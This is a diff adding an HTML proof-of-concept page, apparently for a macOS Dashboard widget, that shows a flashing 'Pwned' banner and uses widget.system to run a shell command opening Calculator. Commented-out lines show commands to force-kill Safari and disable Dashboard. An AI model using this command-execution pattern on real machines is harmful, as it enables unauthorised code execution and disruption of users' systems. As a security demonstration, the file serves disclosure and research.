@@ -1,0 +1,38 @@
+<meta charset='UTF-8'>
+<style>
+    h1 {
+        text-align: center;
+        font-weight: 100;
+        font-family: sans-serif;
+        font-size: 3em;
+        color: #fff;
+    }
+
+    .breathe {
+        -webkit-animation-timing-function: ease-in-out;
+        -webkit-animation-name: breathe;
+        -webkit-animation-duration: 200ms;
+        -webkit-animation-iteration-count: infinite;
+        -webkit-animation-direction: alternate;
+    }
+
+    @-webkit-keyframes breathe {
+        0% {
+            opacity: 1;
+        }
+
+        100% {
+            opacity: .4;
+        }
+    }
+</style>
+<h1 class="breathe">Pwned by AntFin LightYear</h1>
+<script type='text/javascript'>
+    window.onload = function () {
+        widget.onshow = function () {
+            widget.system('/usr/bin/open -a Calculator');
+            // widget.system('/usr/bin/killall -9 Safari');
+            // widget.system('/usr/bin/defaults write com.apple.dashboard mcx-disabled -boolean YES');
+        }
+    }
+</script>
